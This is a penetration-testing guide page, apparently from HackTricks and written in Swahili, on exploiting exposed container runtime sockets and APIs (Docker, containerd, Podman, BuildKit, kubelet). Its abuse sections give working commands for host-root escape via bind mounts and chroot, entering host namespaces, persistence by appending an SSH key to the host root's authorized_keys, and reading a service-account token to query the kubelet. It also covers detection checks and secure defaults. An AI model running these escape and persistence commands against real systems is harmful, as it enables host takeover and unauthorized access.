# Ufunuaji wa Runtime API na Daemon

{{#include ../../../banners/hacktricks-training.md}}

## Muhtasari

Compromise nyingi halisi za container hazianzi kabisa kwa namespace escape. Huanzia kwenye ufikiaji wa control plane ya runtime. Ikiwa workload inaweza kuwasiliana na `dockerd`, `containerd`, CRI-O, Podman, au kubelet kupitia Unix socket iliyowekwa ndani ya container au TCP listener iliyo wazi, attacker anaweza kuomba container mpya yenye privileges bora zaidi, ku-mount filesystem ya host, kujiunga na host namespaces, au kupata taarifa nyeti za node. Katika hali hizo, runtime API ndiyo security boundary halisi, na ku-compromise API hiyo kwa utendaji ni karibu sawa na ku-compromise host.

Ndiyo sababu socket exposure ya runtime inapaswa kurekodiwa kando na kernel protections. Container yenye seccomp, capabilities, na MAC confinement za kawaida bado inaweza kuwa API call moja tu kutoka kwa host compromise ikiwa `/var/run/docker.sock` au `/run/containerd/containerd.sock` ime-mountiwa ndani yake. Kernel isolation ya container ya sasa inaweza kuwa ikifanya kazi hasa ilivyoundwa kufanya, huku management plane ya runtime ikiwa bado imewekwa wazi kikamilifu.

## Miundo ya Ufikiaji wa Daemon

Docker Engine kwa kawaida huweka API yake yenye privileges kupitia Unix socket ya ndani kwenye `unix:///var/run/docker.sock`. Kihistoria, pia imewekwa wazi kwa mbali kupitia TCP listeners kama `tcp://0.0.0.0:2375` au listener iliyolindwa na TLS kwenye `2376`. Kuweka daemon wazi kwa mbali bila TLS imara na client authentication kwa ufanisi hugeuza Docker API kuwa remote root interface.

containerd, CRI-O, Podman, na kubelet huweka wazi attack surfaces zenye athari kubwa zinazofanana. Majina na workflows hutofautiana, lakini mantiki haibadiliki. Ikiwa interface inamruhusu caller kuunda workloads, ku-mount host paths, kupata credentials, au kubadilisha containers zinazoendesha, interface hiyo ni privileged management channel na inapaswa kushughulikiwa ipasavyo.

Common local paths zinazofaa kukaguliwa ni:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Stacks za zamani au zilizobobea zaidi zinaweza pia kufichua endpoints kama `dockershim.sock`, `frakti.sock`, au `rktlet.sock`. Hizi hazitumiki sana katika mazingira ya kisasa, lakini zinapopatikana zinapaswa kushughulikiwa kwa tahadhari ileile kwa sababu zinawakilisha maeneo ya udhibiti wa runtime badala ya sockets za kawaida za application.

## Ufikiaji Salama wa Mbali

Ikiwa daemon lazima ifichuliwe nje ya socket ya ndani, connection inapaswa kulindwa kwa TLS na ikiwezekana kwa mutual authentication ili daemon ithibitishe client na client ithibitishe daemon. Tabia ya zamani ya kufungua Docker daemon kupitia HTTP isiyo na encryption kwa ajili ya urahisi ni mojawapo ya makosa hatari zaidi katika usimamizi wa containers kwa sababu API surface ina uwezo wa kutosha kuunda containers zenye privileges moja kwa moja.

Muundo wa kihistoria wa configuration ya Docker ulionekana hivi:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Kwenye hosts zinazotumia systemd, mawasiliano ya daemon yanaweza pia kuonekana kama `fd://`, ikimaanisha kuwa mchakato hurithi socket iliyofunguliwa awali kutoka kwa systemd badala ya kuifunga moja kwa moja wenyewe. Somo muhimu si sintaksia halisi, bali athari ya kiusalama. Mara tu daemon inaposikiliza nje ya socket ya ndani yenye ruhusa zilizobana, usalama wa transport na uthibitishaji wa client huwa wa lazima badala ya kuwa hardening ya hiari.

## Matumizi mabaya

Ikiwa runtime socket ipo, thibitisha ni ipi, kama client inayooana ipo, na kama ufikiaji wa raw HTTP au gRPC unawezekana:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
Amri hizi ni muhimu kwa sababu hutofautisha kati ya path iliyokufa, socket iliyomountiwa lakini isiyoweza kufikiwa, na API hai yenye privileges. Ikiwa client inafaulu, swali linalofuata ni ikiwa API inaweza kuzindua container mpya yenye host bind mount au kushiriki host namespace.

### Wakati Hakuna Client Iliyosakinishwa

Kutokuwepo kwa `docker`, `podman`, au CLI nyingine rafiki hakumaanishi kuwa socket ni salama. Docker Engine huzungumza HTTP kupitia Unix socket yake, na Podman hutoa API inayooana na Docker pamoja na API ya asili ya Libpod kupitia `podman system service`. Hii inamaanisha kuwa mazingira madogo yenye `curl` pekee huenda bado yakatosha kuendesha daemon:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
Hili ni muhimu wakati wa post-exploitation kwa sababu defenders wakati mwingine huondoa client binaries za kawaida lakini wakaacha management socket ikiwa mounted. Kwenye hosts za Podman, kumbuka kuwa path yenye thamani kubwa hutofautiana kati ya deployments za rootful na rootless: `unix:///run/podman/podman.sock` kwa rootful service instances na `unix://$XDG_RUNTIME_DIR/podman/podman.sock` kwa rootless.

### Mfano Kamili: Docker Socket Hadi Host Root

Ikiwa `docker.sock` inafikika, classical escape ni kuanzisha container mpya inayomount host root filesystem, kisha kutumia `chroot` kuingia ndani yake:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Hii hutoa utekelezaji wa moja kwa moja wa host-root kupitia Docker daemon. Athari haiishii kwenye usomaji wa mafaili pekee. Baada ya kuingia kwenye container mpya, attacker anaweza kubadilisha mafaili ya host, kuvuna credentials, kupandikiza persistence, au kuanzisha workloads nyingine zenye privileges.

### Mfano Kamili: Docker Socket Hadi Host Namespaces

Ikiwa attacker anapendelea kuingia kwenye namespace badala ya kupata ufikiaji wa filesystem pekee:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Njia hii hufikia host kwa kuiomba runtime iunde container mpya yenye host-namespace exposure iliyoainishwa wazi, badala ya kutumia udhaifu wa container iliyopo.

### Docker Socket Persistence Pattern

Runtime control inaweza pia kutumiwa kwa persistence badala ya shell ya mara moja. Muundo wa jumla ni kuunda helper container yenye host mount, kuandika authorized access material au startup hook kwenye mounted host filesystem, kisha kuthibitisha kuwa host inaitumia.

Muundo wa mfano:
```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```
Wazo hilo hilo linaweza kulenga systemd units, cron fragments, application startup files, au SSH keys kulingana na kile operator anachotaka kuthibitisha. Jambo muhimu ni kwamba mabadiliko ya kudumu yanafanywa kupitia mamlaka ya filesystem ya kiwango cha host ya runtime daemon, si kupitia privilege ya ziada ndani ya container ya awali.

### Raw Docker API Helper Pivot

Docker CLI inapokosekana, mtiririko huohuo wa host-mount helper unaweza kuendeshwa kupitia HTTP kwa kutumia Unix socket. Mtiririko wa jumla ni: thibitisha API, tengeneza helper container yenye host bind mount, ianzishe, tengeneza exec instance, kisha uanzishe exec hiyo.
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
-X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
-X POST http://localhost/v1.54/containers/helper/exec
```
Ombi la mwisho la `/exec/<id>/start` linategemea exec ID iliyorejeshwa, lakini hoja ya usalama haitegemei mpangilio halisi wa JSON: ufikiaji wa raw API wa Docker daemon ya rootful unatosha kuomba workload saidizi yenye nguvu zaidi.

### Mfano Kamili: containerd Socket

Socket ya `containerd` iliyomountiwa kwa kawaida huwa hatari vivyo hivyo:<sup>[[1]](#references)</sup>
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Ikiwa client inayofanana zaidi na Docker ipo, `nerdctl` inaweza kuwa rahisi zaidi kuliko `ctr` kwa sababu inatoa flags zinazojulikana kama `--privileged`, `--pid=host`, na `-v`:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
Athari bado ni host compromise. Hata kama Docker-specific tooling haipo, runtime API nyingine bado inaweza kutoa nguvu zilezile za kiutawala. Kwenye Kubernetes nodes, `crictl` pia inaweza kutosha kwa reconnaissance na container interaction kwa sababu inazungumza moja kwa moja na CRI endpoint.

### BuildKit Socket

`buildkitd` ni rahisi kupuuzwa kwa sababu watu mara nyingi huifikiria kama "build backend tu", lakini daemon bado ni privileged control plane. `buildkitd.sock` inayoweza kufikiwa inaweza kumruhusu attacker kuendesha build steps kiholela, kukagua uwezo wa worker, kutumia local contexts kutoka kwenye compromised environment, na kuomba entitlements hatari kama `network.host` au `security.insecure` wakati daemon ilisanidiwa kuziruhusu.

Mwingiliano wa awali unaofaa ni:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
Ikiwa daemon inakubali build requests, jaribu ikiwa insecure entitlements zinapatikana:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
Athari halisi inategemea usanidi wa daemon, lakini service ya BuildKit yenye rootful na entitlements zinazoruhusu mambo mengi si urahisi usio na madhara kwa developer. Ichukulie kama administrative surface nyingine yenye thamani kubwa, hasa kwenye CI runners na shared build nodes.

### Kubelet API Kupitia TCP

Kubelet si container runtime, lakini bado ni sehemu ya node management plane na mara nyingi hujadiliwa ndani ya trust boundary hiyo hiyo. Ikiwa secure port ya kubelet `10250` inaweza kufikiwa kutoka kwenye workload, au ikiwa node credentials, kubeconfigs, au proxy rights zimefichuliwa, attacker anaweza kuorodhesha Pods, kupata logs, au kutekeleza commands kwenye node-local containers bila kugusa Kubernetes API server admission path hata mara moja.

Anza na discovery rahisi:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
Ikiwa kubelet au njia ya proxy ya API-server inaidhinisha `exec`, mteja anayeweza kutumia WebSocket anaweza kubadilisha hilo kuwa code execution katika containers nyingine kwenye node. Hii pia ndiyo sababu `nodes/proxy` yenye ruhusa ya `get` pekee ni hatari zaidi kuliko inavyoweza kuonekana: request bado inaweza kufikia kubelet endpoints zinazoendesha commands, na mwingiliano huo wa moja kwa moja na kubelet hauonekani katika Kubernetes audit logs za kawaida.<sup>[[2]](#references)</sup>

## Ukaguzi

Lengo la ukaguzi huu ni kujibu ikiwa container inaweza kufikia management plane yoyote ambayo ilipaswa kubaki nje ya trust boundary.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
Kinachovutia hapa:

- Socket ya runtime iliyomountiwa kwa kawaida ni primitive ya moja kwa moja ya kiutawala badala ya kuwa ufichuzi wa taarifa pekee.
- TCP listener kwenye `2375` bila TLS inapaswa kuchukuliwa kama hali ya remote-compromise.
- Environment variables kama `DOCKER_HOST` mara nyingi hufichua kwamba workload iliundwa kimakusudi kuwasiliana na runtime ya host.

## Defaults za Runtime

| Runtime / platform | Hali ya default | Tabia ya default | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Local Unix socket by default | `dockerd` husikiliza kwenye local socket na daemon kwa kawaida huwa rootful | mounting `/var/run/docker.sock`, exposing `tcp://...:2375`, weak or missing TLS on `2376` |
| Podman | Daemonless CLI by default | Hakuna long-lived privileged daemon inayohitajika kwa matumizi ya kawaida ya local; API sockets bado zinaweza ku-exposewa wakati `podman system service` imewezeshwa | exposing `podman.sock`, running the service broadly, rootful API use |
| containerd | Local privileged socket | Administrative API huwekwa wazi kupitia local socket na kwa kawaida hutumiwa na higher-level tooling | mounting `containerd.sock`, broad `ctr` or `nerdctl` access, exposing privileged namespaces |
| CRI-O | Local privileged socket | CRI endpoint imekusudiwa kwa trusted components za node-local | mounting `crio.sock`, exposing the CRI endpoint to untrusted workloads |
| Kubernetes kubelet | Node-local management API | Kubelet haipaswi kufikiwa kwa upana kutoka kwa Pods; access inaweza kufichua pod state, credentials, na execution features kulingana na authn/authz | mounting kubelet sockets or certs, weak kubelet auth, host networking plus reachable kubelet endpoint |

## References

- [1] [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)

{{#include ../../../banners/hacktricks-training.md}}
